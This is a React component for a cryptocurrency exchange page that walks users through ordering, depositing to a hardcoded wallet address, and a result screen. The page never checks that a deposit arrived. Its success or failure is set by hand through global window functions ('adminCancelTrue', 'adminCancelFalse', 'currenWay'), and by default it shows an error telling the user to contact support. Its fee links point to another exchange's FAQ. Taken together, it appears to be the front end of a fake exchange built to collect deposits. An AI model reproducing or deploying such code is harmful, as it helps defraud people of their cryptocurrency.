
//? стили
import './ExchangeBuy.css';

import BigTitle from './../../../components/BigTitle/BigTitle.js';
import Field from './../../../components/Field/Field';
import { useEffect, useState } from 'react';
import ChangeButton from './../../../components/ChangeButton/ChangeButton';
import BigButton from './../../../components/BigButton/BigButton';
import useForm from './../../../hooks/useForm.js';

import imgRight from './../../../images/Right.svg';
import { NavLink } from 'react-router-dom';

import { CryptoContent, imageWaiting as wait, imagePopupInfoComplete as complete, imageError as error } from './../../../utils/constants.js';

function ExchangeBuy({
  sendValue = 1,
  sendValueInputName = '',
  handleChangeSendValue,
  openCryptoPopupSend,
  openCryptoPopupRes,
  resulValue,

  sendCrypto,
  resultingCrypto,

}) {

  const [currenWay, setCurrenWay] = useState();
  const [adminCancel, setAdminCancel] = useState(true);


  const { values: exchangeWay, handleChange: handleExchangeWay, setValues: setExchangeWay } = useForm({
    img: '',
    alt: '',
    title: '',
    message: '',
  });

  window.adminCancelTrue = (() => {
    setAdminCancel(true);
  })

  window.adminCancelFalse = (() => {
    setAdminCancel(false);
  })

  window.currenWay = ((number) => {
    setCurrenWay(number);
  })

  useEffect(() => {
    setCurrenWay(1);
  }, [])

  const { values, handleChange, setValues } = useForm({
    adress: '',
    adressDeposit: '1PYGYNk77eaKkizw2WzeoJyUmYLojrU3PC',
  });

  useEffect(() => {
    setValues({
      adress: values.adress,
      adressDeposit: CryptoContent[sendCrypto.alt].addres,
    })
  }, [sendCrypto])

  useEffect(() => {
    if (currenWay === 4) {
      setExchangeWay({
        img: complete,
        alt: 'complete',
        title: 'Successfully!',
        message: 'Cryptocurrency was transferred to your address',
      })
    } else {
      if (currenWay === 3) {
        if (adminCancel) {
          setExchangeWay({
            img: error,
            alt: 'error',
            title: 'Something went wrong.',
            message: <p className='exchange-buy__message'>Please write to our <NavLink className={'exchange-buy__message link_footerPages link'} to={'/Support'}>Support</NavLink>!</p>
          })
        } else {
          setExchangeWay({
            img: wait,
            alt: 'waiting',
            title: 'Your deposit is received.',
            message: <p className='exchange-buy__message'>Awaiting the completion of the transfer.</p>
          })
        }
      }
    }


  }, [currenWay, adminCancel])

  function toSecondEtape(event) {
    event.preventDefault();
    setCurrenWay(2);
  }

  function toThirdEtape(event) {
    event.preventDefault();
    setCurrenWay(3);
  }

  return (
    <article className='exchange-buy'>
      <div className='exchange-buy__all-ways'>
        <div className='exchange-buy__way'>
          <div className={currenWay === 1 ? 'exchange-buy__way-nummer_current exchange-buy__way-nummer' : 'exchange-buy__way-nummer'}>1</div>
          <p className='exchange-buy__way-name'>Place Order</p>
        </div>

        <div className='exchange-buy__way'>
          <span className={currenWay === 2 ? 'exchange-buy__way-line_current exchange-buy__way-line' : 'exchange-buy__way-line'}></span>
          <div className={currenWay === 2 ? 'exchange-buy__way-nummer_current exchange-buy__way-nummer' : 'exchange-buy__way-nummer'}>2</div>
          <p className='exchange-buy__way-name'>Deposit</p>
        </div>

        <div className='exchange-buy__way'>
          <span className={currenWay === 3 ? 'exchange-buy__way-line_current exchange-buy__way-line' : 'exchange-buy__way-line'}></span>
          <div className={currenWay === 3 ? 'exchange-buy__way-nummer_current exchange-buy__way-nummer' : 'exchange-buy__way-nummer'}>3</div>
          <p className='exchange-buy__way-name'>Exchange</p>
        </div>

        <div className='exchange-buy__way'>
          <span className={currenWay === 4 ? 'exchange-buy__way-line_current exchange-buy__way-line' : 'exchange-buy__way-line'}></span>
          <div className={currenWay === 4 ? 'exchange-buy__way-nummer_current exchange-buy__way-nummer' : 'exchange-buy__way-nummer'}>4</div>
          <p className='exchange-buy__way-name'>Complete</p>
        </div>
      </div>

      {/*//* exchange-buy-form */}
      <div id='exchange-buy-form' className={currenWay !== 1 ? 'exchange-buy__container exchange-buy__container_closed' : 'exchange-buy__container'}>
        <BigTitle id={'cryptocurrency-exchange'}>
          Cryptocurrency exchange
        </BigTitle>

        <form className='exchange-buy__form'>
          <div className='exchange-buy__fields-info'>
            <div className='exchange-buy__fields'>
              <Field
                className={'field__input_big'}
                isPlaceholder={false}
                value={sendValue}
                inputName={sendValueInputName}
                fieldName='You Send'
                handleChange={handleChangeSendValue}
                minLength={null}
                maxLength={null}
                type='number'
              >
                <ChangeButton
                  crypto={sendCrypto}
                  func={openCryptoPopupSend}
                />

              </Field>
              <Field
                className={'field__input_big'}
                isPlaceholder={false}
                inputName={null}
                fieldName='You Receive'
                value={resulValue}
                handleChange={null}
                minLength={null}
                maxLength={null}
                type='number'
                readOnly={true}
              >
                <ChangeButton
                  crypto={resultingCrypto}
                  func={openCryptoPopupRes}
                />
              </Field>
            </div>

            <div className='exchange-buy__information'>
              <h3 className='exchange-buy__information-title'>Exchange information</h3>
              <div className='exchange-buy__information-container'>
                <div className='exchange-buy__information-info'>
                  <p className='exchange-buy__information-value'>Curren rate</p>
                  <p className='exchange-buy__information-value'>1 {sendCrypto.alt} = {(resulValue / (sendValue > 0 ? sendValue : 1)).toFixed(4)} {resultingCrypto.alt}</p>
                </div>
                <div className='exchange-buy__information-info'>
                  <p className='exchange-buy__information-value'>Exchange Fee</p>
                  <p className='exchange-buy__information-value'>1 {resultingCrypto.alt}</p>
                </div>
                <div className='exchange-buy__information-info'>
                  <p className='exchange-buy__information-value'>Network Fee</p>
                  <p className='exchange-buy__information-value'>1 {resultingCrypto.alt}</p>
                </div>
                <div className='exchange-buy__information-info'>
                  <p className='exchange-buy__information-value'>Processing Time</p>
                  <p className='exchange-buy__information-value'>12-16 Minutes</p>
                </div>
              </div>
            </div>
          </div>
          <div className='exchange-buy__destination-adress'>
            <Field
              className={'field__input_big field__input_width-plus'}
              isPlaceholder={true}
              inputName={'adress'}
              fieldName='Destination Adress'
              value={values.adress}
              handleChange={handleChange}
              minLength={null}
              maxLength={null}
              type='text'
              readOnly={false}
            >
              <ChangeButton
                crypto={resultingCrypto}
                func={openCryptoPopupRes}
              />
            </Field>
          </div>

          <BigButton func={toSecondEtape}>
            Exchange
          </BigButton>
        </form>
      </div>

      {/*//* exchange-buy-adress */}
      <div id='exchange-buy-adress' className={currenWay !== 2 ? 'exchange-buy__container exchange-buy__container_closed' : 'exchange-buy__container'}>
        {/* 1 */}
        <div className='exchange-buy__adress-info'>
          <h2 className='exchange-buy__title exchange-buy__title_deposit'>
            Please deposit {sendValue} {sendCrypto.alt} on the {sendCrypto.alt} network to the following adress:
          </h2>
          <Field
            className={'field__input_big field__input_width-plus'}
            isPlaceholder={false}
            inputName={'adressDeposit'}
            fieldName='Deposit Adress'
            value={values.adressDeposit}
            handleChange={null}
            minLength={null}
            maxLength={null}
            type='text'
            readOnly={true}
          >
            <button
              className='exchange-buy__button-copy button'
              type='button'
              onClick={() => { navigator.clipboard.writeText(values.adressDeposit) }}
            >
              Copy Adress
            </button>
          </Field>
          <div className='exchange-buy__information'>
            <div className='exchange-buy__information-container'>
              <ul className='exchange-buy__information-list'>
                <li>Your order will automatically proceed to the next step when your deposit arrives at the address shown above.</li>
                <li>If you do not deposit the amount shown above, or your deposit does not arrive within 6 hours, for security purposes your order will not be processed automatically.</li>
                <li>If you have any questions or want to leave your feedback, we would love to hear from you</li>
              </ul>
            </div>
          </div>
        </div>
        {/* 2 */}
        <div className='exchange-buy__adress-details'>
          <h2 className='exchange-buy__title'>
            Order Details
          </h2>

          <div className='exchange-buy__fields exchange-buy__fields_adress'>
            <Field
              className={'field__input_adress field__input_big'}
              isPlaceholder={false}
              value={sendValue}
              inputName={sendValueInputName}
              fieldName='You Send'
              handleChange={handleChangeSendValue}
              minLength={null}
              maxLength={null}
              type='number'
            >
              <ChangeButton
                crypto={sendCrypto}
                func={openCryptoPopupSend}
              />

            </Field>
            <img
              alt='>>>'
              src={imgRight}
            />
            <Field
              className={'field__input_adress field__input_big'}
              isPlaceholder={false}
              inputName={null}
              fieldName='You Receive'
              value={resulValue}
              handleChange={null}
              minLength={null}
              maxLength={null}
              type='number'
              readOnly={true}
            >
              <ChangeButton
                crypto={resultingCrypto}
                func={openCryptoPopupRes}
              />
            </Field>
          </div>

          <div className='exchange-buy__adresses'>
            <div className='exchange-buy__adress'>
              <p className='exchange-buy__adress-name'>Deposit Adress:</p>
              <p className='exchange-buy__adress-value'>{values.adressDeposit}</p>
            </div>
            <div className='exchange-buy__adress'>
              <p className='exchange-buy__adress-name'>Reception Adress:</p>
              <p className='exchange-buy__adress-value'>{values.adress}</p>
            </div>
          </div>
        </div>
        {/* 3 */}
        <div className='exchange-buy__information'>
          <div className='exchange-buy__information-container'>
            <ul className='exchange-buy__information-list'>
              <li>In the receiving amount shown above, <NavLink className={'link_footerPages link'} to={'https://easybit.com/en/faq?faq=exchange-fee'}>Exchange Fee</NavLink> and <NavLink className={'link_footerPages link'} to={'https://easybit.com/en/faq?faq=exchange-fee'}>Network Fee</NavLink>  are already included!</li>
            </ul>
          </div>
        </div>

        <BigButton func={toThirdEtape}>
          I have already paid
        </BigButton>
      </div>

      {/*//* exchange-buy-received */}
      <div id='exchange-buy-received' className={((currenWay === 3) || (currenWay === 4)) ? 'exchange-buy__container' : 'exchange-buy__container exchange-buy__container_closed'}>
        <h2 className='exchange-buy__title exchange-buy__title_center'>
          {exchangeWay.title}
        </h2>

        <img
          className='exchange-buy__img-result'
          src={exchangeWay.img}
          alt={exchangeWay.alt}
        />

        {exchangeWay.message}

        {adminCancel ? <NavLink className={'link_footerPages link'} to={'/Home'}>Home</NavLink> : <p className='exchange-buy__message-waiting'>Approximate time of completion: 15 minutes</p>}

      </div>
    </article>
  )
}

export default ExchangeBuy;

